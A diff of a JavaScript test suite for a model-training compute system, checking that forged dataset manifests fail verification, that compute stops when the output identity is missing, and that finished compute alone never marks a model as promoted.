-test("ADVERSARIAL — a forged persisted dataset manifest cannot launder itself through verification recompilation", () => {
-  const baseConfig = authorityConfig({});
-  const { authority } = compileComputeAuthority({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, now: "t", env: AUTH_ENV });
-  // Attacker-shaped persisted authority: bad seal, poisoned corpus manifest.
-  const poisoned = { ...authority, dataset: { ...authority.dataset, corpusSha256: "0".repeat(64), sizeBytes: 1, binding: "manifest" }, seal: "0".repeat(64) };
+test("ADVERSARIAL — forged persisted dataset manifest cannot launder itself into recompilation", () => {
+  const baseConfig = authorityConfig();
+  const { authority } = compileComputeAuthority({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, env: AUTH_ENV });
+  const poisoned = {
+    ...authority,
+    dataset: { ...authority.dataset, corpusSha256: "0".repeat(64), sizeBytes: 1, binding: "manifest" },
+    seal: "0".repeat(64),
+  };
   const verdict = verifyComputeAuthorityAgainstWorkspace({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, authority: poisoned, env: AUTH_ENV });
   assert.equal(verdict.ok, false);
-  assert.ok(verdict.recompiled, "current truth recompiles from trusted inputs");
-  assert.equal(verdict.recompiled.dataset.corpusSha256, "", "the recompiled authority uses ONLY the trusted server manifest — never the poisoned persisted one");
+  assert.ok(verdict.recompiled);
+  assert.equal(verdict.recompiled.dataset.corpusSha256, "");
   assert.equal(verdict.recompiled.dataset.binding, "metadata-only");
 });
 
-test("ADVERSARIAL — authority compilation failure (missing output identity) refuses remote compute before any provider call", async () => {
+test("ADVERSARIAL — missing output identity refuses remote compute before provider IO", async () => {
   const config = authorityConfig({ request: authorityRequest({ outputModelTag: "" }) });
-  const adapter = adapterWith({
-    async allocate() { throw new Error("allocate must never be reached without compiled authority"); },
-  });
+  const adapter = adapterWith({ async allocate() { throw new Error("allocate must never be reached"); } });
   const outcome = await maybeExecuteProviderComputeForSandboxRun({
     workspaceConfig: config,
     objectId: "model-training-runner",
@@ -385,11 +507,14 @@ test("ADVERSARIAL — authority compilation failure (missing output identity) re
   });
   assert.equal(outcome.result.ok, false);
   assert.match(outcome.result.error, /authority compilation failed \(output-identity-missing\)/);
+  assert.equal(adapter.calls.allocate, 0);
 });
 
-test("PROMOTION BOUNDARY — compute completion can never promote: promoted is a derived evaluation verdict only", () => {
-  // 1. The eval harness derives `promoted` from measured wins — an empty or
-  //    losing result set can never promote, whatever compute reported.
+// ---------------------------------------------------------------------------
+// Promotion remains a workspace-owned evaluation boundary
+// ---------------------------------------------------------------------------
+
+test("PROMOTION BOUNDARY — compute completion cannot promote without canonical measured wins", () => {
   assert.equal(deriveBenchmarkWins({ results: [] }).promoted, false);
   assert.equal(deriveBenchmarkWins({ results: [
     { taskId: "t1", student: { quality: 0.2 }, baseline: { quality: 0.9 } },
@@ -397,10 +522,8 @@ test("PROMOTION BOUNDARY — compute completion can never promote: promoted is a
     { taskId: "t3", student: { quality: 0.1 }, baseline: { quality: 0.9 } },
     { taskId: "t4", student: { quality: 0.4 }, baseline: { quality: 0.9 } },
     { taskId: "t5", student: { quality: 0.2 }, baseline: { quality: 0.7 } },
-  ] }).promoted, false, "losing candidates are never promoted");
+  ] }).promoted, false);
 
-  // 2. A completed+artifact compute receipt WITHOUT a benchmark win keeps
-  //    the flywheel's benchmark-promoted step open.
   const receipts = {
     "training-run:model-training:workspace-local": {
       records: [{
@@ -415,22 +538,20 @@ test("PROMOTION BOUNDARY — compute completion can never promote: promoted is a
     },
   };
   const flywheel = deriveFlywheelState({ workspaceConfig: {}, workspaceSourceRecords: receipts, slug: "workspace-local" });
-  const promotedStep = flywheel.steps.find((s) => s.id === "benchmark-promoted");
-  assert.equal(promotedStep.done, false, "compute completion did not tick the promotion step");
+  assert.equal(flywheel.steps.find((step) => step.id === "benchmark-promoted").done, false);
 
-  // 3. And the customer surface says "evaluating", never "promoted".
   const state = deriveComputeCustomerState({
     computeBlock: {
       schema: "growthub-compute-evidence-v1",
       capacityProfileId: "single-gpu-finetune",
-      decision: { schema: "growthub-compute-decision-v1", capacityProfileId: "single-gpu-finetune", selectedProviderId: "adv-remote", selectedReasons: [], candidates: [], budget: { mode: "advisory", maxTotalUsd: 0, maxHourlyUsd: 0, allowUnknownCost: false }, selectionMode: "auto", requirements: null, decidedAt: "t", evidenceObservedAt: "t" },
+      decision: { schema: "growthub-compute-decision-v1", selectedProviderId: "adv-remote", selectedReasons: [], candidates: [], budget: { mode: "advisory", maxTotalUsd: 0, maxHourlyUsd: 0, allowUnknownCost: false }, selectionMode: "auto", requirements: null, decidedAt: "t", evidenceObservedAt: "t" },
       allocation: { allocationId: "a", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, status: "completed", idempotencyKeyHash: "h", availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "t", releaseConfirmed: true, allocated: null },
       events: [
-        { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "", detail: "" },
+        { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "rq", detail: "" },
         { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "1", detail: "" },
         { type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "2", detail: "" },
         { type: "compute-completed", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "3", detail: "" },
-        { type: "compute-release-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "", detail: "" },
+        { type: "compute-release-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "rr", detail: "" },
         { type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "4", detail: "" },
       ],
       checkpoints: [],
@@ -439,5 +560,5 @@ test("PROMOTION BOUNDARY — compute completion can never promote: promoted is a
     },
     benchmarkWins: null,
   });
-  assert.equal(state.stateId, "evaluating", "completion without an evaluation win is EVALUATING, never promoted");
+  assert.equal(state.stateId, "evaluating");
 });
